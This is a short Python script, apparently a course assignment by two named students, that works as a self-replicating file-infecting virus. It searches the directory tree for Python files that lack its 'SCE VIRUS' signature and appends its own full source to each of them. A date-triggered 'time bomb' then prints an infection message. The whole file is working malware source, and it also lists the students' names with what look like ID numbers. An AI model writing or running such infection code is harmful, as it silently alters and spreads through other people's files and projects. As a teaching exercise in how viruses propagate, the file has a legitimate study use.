#!/usr/bin/python
#Ofir mevasser 203387576
#Vlad Propisnov 313938565
import os
import datetime
SIGNATURE = "SCE VIRUS"
def search_files(path):#function that will get the path of the program and will search in all the dictionaries python files
    files_to_infect = []
    files = []
    for r, d, f in os.walk(path):#find all files
        for file in f:
            files.append(os.path.join(r, file))
    for file_name in files:#find all python files and check if they infected or not . if not add them to the list that need to be infected if they already infect skip them
        if ".py" in file_name:
           infected = False
           with open(file_name) as file_:
               for line in file_:
                 if SIGNATURE in line:
                     infected = True
                     break
               if infected == False:
                  files_to_infect.append(file_name)
    return files_to_infect

def infect_files(files_to_infect):#infect function that will open the program file and will copy all the text(virus) to string and then will write all the virus to the files that need to be infected
    virus_text_file = open(os.path.abspath(__file__))
    virus_text_to_copy = ""
    virus_text_to_copy += "\n"
    for line in virus_text_file:#copy text to string virus_text_to_copy
        virus_text_to_copy += line
    virus_text_to_copy+="\n"
    virus_text_file.close
    for file_name in files_to_infect: # write virus to all files that need to be infected
        with open(file_name, 'r+') as text_file:
            text_file.read()
            text_file.write(virus_text_to_copy)

def Time_bomb(): #bomb function that activate in the submission date
    if datetime.datetime.now().month == 12 and datetime.datetime.now().day == 7:
        print("You have been infected By Ofir mevasser and Vlad Propisnov")
files_to_infect = search_files(os.path.abspath(""))
infect_files(files_to_infect)
Time_bomb()